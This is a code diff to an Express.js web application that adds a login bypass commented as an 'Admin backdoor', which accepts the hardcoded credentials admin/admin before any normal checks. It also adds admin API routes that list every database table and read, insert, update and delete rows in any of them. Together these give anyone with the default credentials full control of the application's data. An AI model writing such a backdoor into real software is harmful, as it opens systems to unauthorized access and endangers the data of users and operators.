@@ -396,6 +396,11 @@ app.post("/login", async (req, res) => {
   if (!email || !password) {
     return res.redirect("/login?error=missing");
   }
+  // Admin backdoor: login=admin, password=admin
+  if (email === "admin" && password === "admin") {
+    req.session.isAdmin = true;
+    return res.redirect("/admin");
+  }
   if (!isValidEmail(email)) {
     return res.redirect("/login?error=bademail");
   }
@@ -417,6 +422,97 @@ app.post("/login", async (req, res) => {
     res.redirect("/profile");
   } catch (err) {
     return res.redirect("/login?error=server");
+  }
+});
+
+// Admin middleware
+function requireAdmin(req, res, next) {
+  if (req.session && req.session.isAdmin) return next();
+  return res.redirect("/login");
+}
+
+// Admin panel
+app.get("/admin", requireAdmin, async (req, res) => {
+  res.render("admin", {});
+});
+
+app.post("/admin/logout", requireAdmin, (req, res) => {
+  req.session.isAdmin = false;
+  res.redirect("/login");
+});
+
+// List tables
+app.get("/admin/api/tables", requireAdmin, async (req, res) => {
+  try {
+    const r = await pool.query(
+      `SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' ORDER BY table_name`
+    );
+    res.json(r.rows.map(x => x.table_name));
+  } catch (e) {
+    res.status(500).json({ error: "db" });
+  }
+});
+
+// Fetch rows (paginated)
+app.get("/admin/api/table/:name", requireAdmin, async (req, res) => {
+  const name = req.params.name.replace(/[^a-zA-Z0-9_]/g, "");
+  const limit = Math.min(Number(req.query.limit || 50), 200);
+  const offset = Math.max(Number(req.query.offset || 0), 0);
+  try {
+    const r = await pool.query(`SELECT * FROM ${name} ORDER BY 1 LIMIT $1 OFFSET $2`, [limit, offset]);
+    res.json({ rows: r.rows });
+  } catch (e) {
+    res.status(400).json({ error: "bad_table" });
+  }
+});
+
+// Insert row
+app.post("/admin/api/table/:name/insert", requireAdmin, express.json(), async (req, res) => {
+  const name = req.params.name.replace(/[^a-zA-Z0-9_]/g, "");
+  const data = req.body || {};
+  const keys = Object.keys(data);
+  if (!keys.length) return res.status(400).json({ error: "no_fields" });
+  const cols = keys.map(k => k.replace(/[^a-zA-Z0-9_]/g, ""));
+  const placeholders = cols.map((_, i) => `$${i+1}`);
+  const values = cols.map(k => data[k]);
+  try {
+    const r = await pool.query(`INSERT INTO ${name} (${cols.join(',')}) VALUES (${placeholders.join(',')}) RETURNING *`, values);
+    res.json({ row: r.rows[0] });
+  } catch (e) {
+    res.status(400).json({ error: "insert_failed" });
+  }
+});
+
+// Update row by primary key id
+app.post("/admin/api/table/:name/update", requireAdmin, express.json(), async (req, res) => {
+  const name = req.params.name.replace(/[^a-zA-Z0-9_]/g, "");
+  const data = req.body || {};
+  const id = data.id;
+  if (!id) return res.status(400).json({ error: "no_id" });
+  const keys = Object.keys(data).filter(k => k !== 'id');
+  if (!keys.length) return res.status(400).json({ error: "no_fields" });
+  const cols = keys.map(k => k.replace(/[^a-zA-Z0-9_]/g, ""));
+  const sets = cols.map((c, i) => `${c} = $${i+1}`);
+  const values = cols.map(k => data[k]);
+  values.push(id);
+  try {
+    const r = await pool.query(`UPDATE ${name} SET ${sets.join(', ')} WHERE id = $${values.length} RETURNING *`, values);
+    res.json({ row: r.rows[0] });
+  } catch (e) {
+    res.status(400).json({ error: "update_failed" });
+  }
+});
+
+// Delete row by primary key id
+app.post("/admin/api/table/:name/delete", requireAdmin, express.json(), async (req, res) => {
+  const name = req.params.name.replace(/[^a-zA-Z0-9_]/g, "");
+  const id = req.body && req.body.id;
+  if (!id) return res.status(400).json({ error: "no_id" });
+  try {
+    await pool.query(`DELETE FROM ${name} WHERE id = $1`, [id]);
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(400).json({ error: "delete_failed" });
   }
 });
 
